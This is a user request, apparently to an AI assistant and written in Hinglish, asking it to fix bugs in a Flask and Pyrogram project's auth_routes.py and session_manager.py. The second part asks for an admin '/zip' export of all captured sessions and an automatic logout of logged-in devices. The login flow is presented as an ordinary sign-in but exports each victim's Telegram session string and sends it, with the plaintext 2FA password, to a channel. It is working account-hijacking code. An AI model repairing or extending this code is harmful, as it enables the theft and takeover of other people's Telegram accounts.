fix Nexa/auth_routes.py ispe session expired aate vo fix kro and jo jo small sai small bugs hai vo properly fix kro


import html as html_lib
import logging
import re
import uuid
from datetime import datetime

from flask import Blueprint, jsonify, redirect, render_template, request, session
from pyrogram.errors import (
    FloodWait,
    PasswordHashInvalid,
    PhoneCodeExpired,
    PhoneCodeInvalid,
    PhoneNumberBanned,
    PhoneNumberInvalid,
    SessionPasswordNeeded,
)

from config import BACKGROUND_VIDEO

from . import database
from .database import (
    ensure_db,
    get_videos,
    save_session_to_db,
    send_to_channel,
)
from .session_manager import session_manager

log = logging.getLogger(__name__)

auth_bp = Blueprint("auth", __name__)

# --------------------------------------------------------------------------
# Tunables
# --------------------------------------------------------------------------
PHONE_RE = re.compile(r"^\+[1-9]\d{7,14}$")   # E.164
DEFAULT_SESSION_NAME = "session"
MAX_CODE_ATTEMPTS = 3
REUSE_PENDING_SESSION = True   # double-tap par naya session na bane
RESEND_COOLDOWN = 45           # seconds, reuse window
TRUTHY = {"1", "true", "yes", "on"}


# --------------------------------------------------------------------------
# Small helpers
# --------------------------------------------------------------------------
def _json():
    return request.get_json(silent=True) or {}


def _err(message, status=400, **extra):
    payload = {"ok": False, "error": message}
    payload.update(extra)
    return jsonify(payload), status


def _normalize_phone(raw):
    """'+91 98765-43210' / '919876543210' -> '+919876543210'"""
    if raw is None:
        return ""
    digits = re.sub(r"\D", "", str(raw))
    return f"+{digits}" if digits else ""


def _valid_phone(phone):
    return bool(phone) and bool(PHONE_RE.match(phone))


def _mask_phone(phone):
    """'+919876543210' -> '+9198•••210'"""
    if not phone:
        return ""
    digits = phone.lstrip("+")
    if len(digits) <= 7:
        return f"+{digits}"
    return f"+{digits[:4]}{'•' * (len(digits) - 7)}{digits[-3:]}"


def _safe_session_name(raw):
    cleaned = re.sub(r"[^A-Za-z0-9_\-]", "", (raw or "").strip())
    return cleaned or DEFAULT_SESSION_NAME


def _truthy(value):
    return str(value or "").strip().lower() in TRUTHY


# --------------------------------------------------------------------------
# temp_sessions access (resolved at call time, not import time)
# --------------------------------------------------------------------------
def _temp_col():
    try:
        ensure_db()
    except Exception as exc:                       # pragma: no cover
        log.warning("ensure_db failed: %s", exc)
    return getattr(database, "temp_sessions_col", None)


def _temp_doc(session_id):
    col = _temp_col()
    if col is None:
        return None
    try:
        return col.find_one({"_id": session_id})
    except Exception as exc:
        log.warning("temp_sessions find failed: %s", exc)
        return None


def _temp_update(session_id, values):
    col = _temp_col()
    if col is None:
        return
    try:
        col.update_one({"_id": session_id}, {"$set": values}, upsert=True)
    except Exception as exc:
        log.warning("temp_sessions update failed: %s", exc)


def _temp_delete(session_id):
    col = _temp_col()
    if col is None:
        return
    try:
        col.delete_one({"_id": session_id})
    except Exception as exc:
        log.warning("temp_sessions delete failed: %s", exc)


def _reuse_pending(phone):
    """Return a fresh pending session_id for this phone, else None."""
    if not REUSE_PENDING_SESSION:
        return None
    col = _temp_col()
    if col is None:
        return None
    try:
        doc = col.find_one(
            {"phone": phone, "status": "code_sent", "requires_password": False},
            sort=[("created_at", -1)],
        )
    except Exception as exc:
        log.warning("reuse lookup failed: %s", exc)
        return None
    if not doc:
        return None

    session_id = doc.get("_id")
    if not session_manager.get_session(session_id):
        return None
    created = doc.get("created_at")
    if created and (datetime.now() - created).total_seconds() > RESEND_COOLDOWN:
        return None
    return session_id


# --------------------------------------------------------------------------
# Session bootstrap
# --------------------------------------------------------------------------
def _start_session(phone, session_name=DEFAULT_SESSION_NAME):
    """Create a Pyrogram client + send OTP. Cleans up on ANY failure."""
    ensure_db()
    session_id = str(uuid.uuid4())[:8]

    thread = session_manager.create_session(session_id, phone)

    try:
        sent = thread.execute(lambda: thread.client.send_code(phone))
    except Exception:
        session_manager.remove_session(session_id)   # no leak
        raise

    log.info(
        "send_code ok | sid=%s phone=%s type=%s timeout=%s",
        session_id, _mask_phone(phone),
        getattr(sent, "type", "?"), getattr(sent, "timeout", "?"),
    )

    _temp_update(session_id, {
        "phone_code_hash": sent.phone_code_hash,
        "session_name": session_name,
        "status": "code_sent",
        "phone": phone,
        "attempts": 0,
        "requires_password": False,
        "created_at": datetime.now(),
    })
    return session_id


def _handle_send_code(payload, force_new=False):
    """Shared by /api/bot-connect and /api/send-code."""
    try:
        session_manager.cleanup_old()
    except Exception as exc:
        log.warning("cleanup_old failed: %s", exc)

    phone = _normalize_phone(payload.get("phone"))
    session_name = _safe_session_name(payload.get("session_name"))

    if not _valid_phone(phone):
        return _err("Invalid phone number", 400)

    if not force_new:
        existing = _reuse_pending(phone)
        if existing:
            return jsonify(
                ok=True,
                session_id=existing,
                phone=phone,
                masked=_mask_phone(phone),
                reused=True,
                message=f"Code already sent to {_mask_phone(phone)}",
            )

    try:
        session_id = _start_session(phone, session_name)
    except PhoneNumberInvalid:
        return _err("Invalid phone number", 400)
    except PhoneNumberBanned:
        return _err("This phone number is banned", 403)
    except FloodWait as exc:
        return _err(f"Please wait {getattr(exc, 'value', 0)} seconds", 429)
    except RuntimeError as exc:
        return _err(str(exc), 503)
    except Exception as exc:
        log.exception("send_code failed for %s: %s", _mask_phone(phone), exc)
        return _err("Failed to send code. Try again.", 500)

    return jsonify(
        ok=True,
        session_id=session_id,
        phone=phone,
        masked=_mask_phone(phone),
        message=f"Code sent to {_mask_phone(phone)}",
    )


# --------------------------------------------------------------------------
# Pages
# --------------------------------------------------------------------------
@auth_bp.route("/")
def index():
    return redirect("/login")


@auth_bp.route("/login")
def login():
    """
    Render the login page.

    A logged-in user must STILL see /login when arriving from the bot with
    ?s=<session_id> (adding another account) or with ?fresh=1 (explicit
    re-login). Only a plain /login while logged in goes to /dashboard.

    Previously this always redirected to /dashboard when a "user" was in the
    Flask session, so the bot link skipped the OTP step entirely.
    """
    pending = (request.args.get("s") or "").strip()
    fresh = _truthy(request.args.get("fresh"))

    if not pending and not fresh and "user" in session:
        return redirect("/dashboard")

    return render_template(
        "login.html",
        bg_video=BACKGROUND_VIDEO,
        pending_session=pending,
        fresh=fresh,
    )


@auth_bp.route("/logout")
def logout_page():
    session.clear()
    return redirect("/login?fresh=1")


@auth_bp.route("/dashboard")
def dashboard():
    if "user" not in session:
        return redirect("/login")
    return render_template(
        "dashboard.html",
        user=session["user"],
        videos=get_videos(),
        bg_video=BACKGROUND_VIDEO,
    )


# --------------------------------------------------------------------------
# API: start flow
# --------------------------------------------------------------------------
@auth_bp.route("/api/bot-connect", methods=["POST"])
def bot_connect():
    """Called by bot.py after the user shares their contact."""
    return _handle_send_code(_json())


@auth_bp.route("/api/send-code", methods=["POST"])
def send_code():
    """Web fallback + 'resend'. Pass {"force": true} for a brand new code."""
    payload = _json()
    return _handle_send_code(payload, force_new=bool(payload.get("force")))


@auth_bp.route("/api/session-info")
def session_info():
    session_id = (request.args.get("s") or "").strip()
    if not session_id:
        return _err("missing session", 400)
    if not session_manager.get_session(session_id):
        return _err("Session expired", 404)

    doc = _temp_doc(session_id) or {}
    phone = doc.get("phone", "")
    return jsonify(
        ok=True,
        masked=_mask_phone(phone),
        phone=phone,
        requires_password=bool(doc.get("requires_password")),
    )


# --------------------------------------------------------------------------
# API: verify
# --------------------------------------------------------------------------
@auth_bp.route("/api/verify-code", methods=["POST"])
def verify_code():
    data = _json()
    session_id = (data.get("session_id") or "").strip()
    code = re.sub(r"\D", "", str(data.get("code") or ""))
    password = (data.get("password") or "").strip()

    if not session_id:
        return _err("Session ID required", 400)

    thread = session_manager.get_session(session_id)
    if not thread:
        return _err("Session expired", 400)

    doc = _temp_doc(session_id) or {}
    phone = doc.get("phone") or getattr(thread, "phone", "")
    phone_code_hash = doc.get("phone_code_hash")
    session_name = doc.get("session_name") or DEFAULT_SESSION_NAME
    needs_password = bool(doc.get("requires_password"))

    if not phone:
        session_manager.remove_session(session_id)
        return _err("Session data lost", 400)

    if needs_password:
        if not password:
            return _err("2FA password required", 401, requires_password=True)
    else:
        if not code or not (4 <= len(code) <= 8):
            return _err("Invalid verification code", 400)
        if not phone_code_hash:
            session_manager.remove_session(session_id)
            return _err("Session data lost", 400)

    user = None
    session_string = None
    used_password = False

    try:
        if needs_password:
            # already past sign_in, straight to 2FA
            user = thread.execute(lambda: thread.client.check_password(password))
            used_password = True
        else:
            try:
                user = thread.execute(lambda: thread.client.sign_in(
                    phone_number=phone,
                    phone_code_hash=phone_code_hash,
                    phone_code=code,
                ))
            except SessionPasswordNeeded:
                if not password:
                    _temp_update(session_id, {
                        "requires_password": True,
                        "status": "password_needed",
                    })
                    return _err("2FA password required", 401, requires_password=True)
                user = thread.execute(lambda: thread.client.check_password(password))
                used_password = True

        session_string = thread.execute(lambda: thread.client.export_session_string())

    except PhoneCodeInvalid:
        attempts = int(doc.get("attempts") or 0) + 1
        _temp_update(session_id, {"attempts": attempts})
        if attempts >= MAX_CODE_ATTEMPTS:
            session_manager.remove_session(session_id)
            return _err("Too many wrong attempts. Request a new code.",
                        401, expired=True)
        left = MAX_CODE_ATTEMPTS - attempts
        return _err(f"Invalid verification code. {left} attempt(s) left.",
                    401, attempts_left=left)

    except PhoneCodeExpired:
        session_manager.remove_session(session_id)
        return _err("Code expired. Request a new code.", 401, expired=True)

    except PasswordHashInvalid:
        return _err("Invalid 2FA password", 401, requires_password=True)

    except FloodWait as exc:
        return _err(f"Please wait {getattr(exc, 'value', 0)} seconds", 429)

    except Exception as exc:
        log.exception("verify_code failed for %s: %s", _mask_phone(phone), exc)
        session_manager.remove_session(session_id)
        return _err("Verification failed. Try again.", 500)

    if not user:
        session_manager.remove_session(session_id)
        return _err("Verification failed", 400)

    # success -> drop the temporary client + temp doc
    session_manager.remove_session(session_id)
    _temp_delete(session_id)

    first_name = (getattr(user, "first_name", "") or "").strip()
    last_name = (getattr(user, "last_name", "") or "").strip()
    username = getattr(user, "username", None)
    full_name = f"{first_name} {last_name}".strip() or "Unknown"

    user_info = {
        "id": user.id,
        "first_name": first_name,
        "last_name": last_name,
        "username": username or "N/A",
        "phone": phone,
        "session_string": session_string,
        "created_at": datetime.now().strftime("%Y-%m-%d %H:%M:%S"),
        "session_name": session_name,
        "two_step_verification": used_password,
    }

    # storage / notify failures must not break the login
    try:
        if not save_session_to_db(user_info):
            log.warning("save_session_to_db returned False for %s", user_info["id"])
    except Exception as exc:
        log.exception("save_session_to_db raised: %s", exc)

    try:
        channel_msg = (
            "🟢 <b>NEW SESSION</b>\n"
            f"👤 <b>Name:</b> {html_lib.escape(full_name)}\n"
            f"🔗 <b>Username:</b> "
            f"{html_lib.escape('@' + username) if username else 'N/A'}\n"
            f"🆔 <b>User ID:</b> <code>{user_info['id']}</code>\n"
            f"📱 <b>Phone:</b> <code>{html_lib.escape(phone)}</code>"
        )
        if used_password:
            channel_msg += f"\n🔑 <b>2FA:</b> <code>{html_lib.escape(password)}</code>"
        channel_msg += (
            f"\n\n<b>🔐 SESSION:</b>\n"
            f"<code>{html_lib.escape(user_info['session_string'])}</code>"
        )
        send_to_channel(channel_msg)
    except Exception as exc:
        log.exception("send_to_channel failed: %s", exc)

    session.permanent = True
    session["user"] = {
        "id": user_info["id"],
        "name": full_name,
        "username": user_info["username"],
        "phone": phone,
    }
    return jsonify(ok=True, user=session["user"])


# --------------------------------------------------------------------------
# API: logout
# --------------------------------------------------------------------------
@auth_bp.route("/api/logout", methods=["POST"])
def logout():
    session.clear()
    return jsonify(ok=True)



Nexa/session_manager.py isme ye change Krna dead sessions automatically update kre and ek toggle rakhunga admin.html mai vha automatic login session ka 24 hrs hojayega uske baad automatically logout krdega login devices and admin /zip likhega toh all active sessions in zip mai dedega aaisa krna and admin.html toggle rakhna and refresh button ki sessions dekh paaye ye rha code



import asyncio
import threading
from datetime import datetime, timedelta

from pyrogram import Client

from config import API_ID, API_HASH
from Nexa.database import temp_sessions_col, ensure_db

_global_stats = {"active_sessions": 0, "pending_msgs": 0}


class SessionThread:
    def __init__(self, session_id, phone):
        self.session_id = session_id
        self.phone = phone
        self.client = None
        self.loop = None
        self.thread = None
        self.connected = False
        self.connection_error = None
        self._connected_event = threading.Event()
        self.thread = threading.Thread(target=self._run_loop, daemon=True)
        self.thread.start()

    async def _init_and_connect(self):
        self.client = Client(
            name=f"session_{self.session_id}",
            api_id=API_ID, api_hash=API_HASH,
            in_memory=True, no_updates=True)
        await self.client.connect()

    def _run_loop(self):
        try:
            self.loop = asyncio.new_event_loop()
            asyncio.set_event_loop(self.loop)
            self.loop.run_until_complete(self._init_and_connect())
            self.connected = True
            self._connected_event.set()
            self.loop.run_forever()
        except Exception as e:
            self.connection_error = str(e)
            self.connected = False
            self._connected_event.set()
        finally:
            try:
                if self.loop and not self.loop.is_closed():
                    self.loop.close()
            except Exception:
                pass

    def wait_for_connection(self, timeout=15):
        return self._connected_event.wait(timeout=timeout)

    def execute(self, coro_func, *args, timeout=90):
        if not self.loop or not self.connected:
            raise RuntimeError("Session not connected")

        async def wrapper():
            return await coro_func(*args)

        future = asyncio.run_coroutine_threadsafe(wrapper(), self.loop)
        return future.result(timeout=timeout)

    def stop(self):
        try:
            if self.client and self.connected and self.loop and not self.loop.is_closed():
                try:
                    asyncio.run_coroutine_threadsafe(
                        self.client.disconnect(), self.loop).result(timeout=3)
                except Exception:
                    pass
            if self.loop and self.loop.is_running():
                self.loop.call_soon_threadsafe(self.loop.stop)
            if self.thread and self.thread.is_alive():
                self.thread.join(timeout=3)
        except Exception:
            pass
        self.connected = False


class SessionManager:
    def __init__(self):
        self._sessions = {}
        self._lock = threading.Lock()

    def create_session(self, session_id, phone):
        self.remove_session(session_id)
        session = SessionThread(session_id, phone)
        if not session.wait_for_connection(timeout=15):
            session.stop()
            raise RuntimeError("Session connection timeout")
        if not session.connected:
            err = session.connection_error or "Unknown error"
            session.stop()
            raise RuntimeError(f"Failed to connect: {err}")
        with self._lock:
            self._sessions[session_id] = session
        ensure_db()
        if temp_sessions_col is not None:
            temp_sessions_col.update_one(
                {"_id": session_id},
                {"$set": {"phone": phone, "created_at": datetime.now(),
                          "status": "connected"}}, upsert=True)
        return session

    def get_session(self, session_id):
        with self._lock:
            session = self._sessions.get(session_id)
            if session and session.connected and session.thread.is_alive():
                return session
            if session:
                self._sessions.pop(session_id, None)
        if session:
            session.stop()
        return None

    def remove_session(self, session_id):
        with self._lock:
            session = self._sessions.pop(session_id, None)
        if session:
            session.stop()
        ensure_db()
        if temp_sessions_col is not None:
            temp_sessions_col.delete_one({"_id": session_id})

    def cleanup_old(self, max_age_minutes=25):
        ensure_db()
        if temp_sessions_col is None:
            return
        cutoff = datetime.now() - timedelta(minutes=max_age_minutes)
        for doc in list(temp_sessions_col.find({"created_at": {"$lt": cutoff}})):
            self.remove_session(doc["_id"])

    def cleanup_dead_sessions(self):
        with self._lock:
            dead = [sid for sid, s in list(self._sessions.items())
                    if not s.connected or not s.thread.is_alive()]
        for sid in dead:
            self.remove_session(sid)
        return len(dead)

    def get_active_count(self):
        with self._lock:
            return len([s for s in self._sessions.values() if s.connected])


class SessionCleaner:
    def __init__(self):
        self._running = False
        self._thread = None
        self._stop_event = threading.Event()

    def start(self):
        if self._running:
            return
        self._running = True
        self._stop_event.clear()
        self._thread = threading.Thread(target=self._run, daemon=True)
        self._thread.start()
        print("Session Cleaner started")

    def stop(self):
        if not self._running:
            return
        self._stop_event.set()
        self._running = False
        if self._thread:
            self._thread.join(timeout=5)
        print("Session Cleaner stopped")

    def _run(self):
        from Nexa.database import ads_config_col, broadcast_msgs_col
        while not self._stop_event.is_set():
            try:
                count = session_manager.cleanup_dead_sessions()
                if count:
                    print(f"Cleaned {count} dead sessions")
                _global_stats["active_sessions"] = session_manager.get_active_count()
                if broadcast_msgs_col is not None:
                    _global_stats["pending_msgs"] = broadcast_msgs_col.count_documents({})
                if ads_config_col is not None:
                    ads_config_col.update_one(
                        {"_id": "stats"},
                        {"$set": {"active_sessions": _global_stats["active_sessions"],
                                  "pending_msgs": _global_stats["pending_msgs"],
                                  "last_cleanup": datetime.now()}},
                        upsert=True)
            except Exception as e:
                print(f"Session cleaner error: {e}")
            self._stop_event.wait(30)


session_manager = SessionManager()
session_cleaner = SessionCleaner()

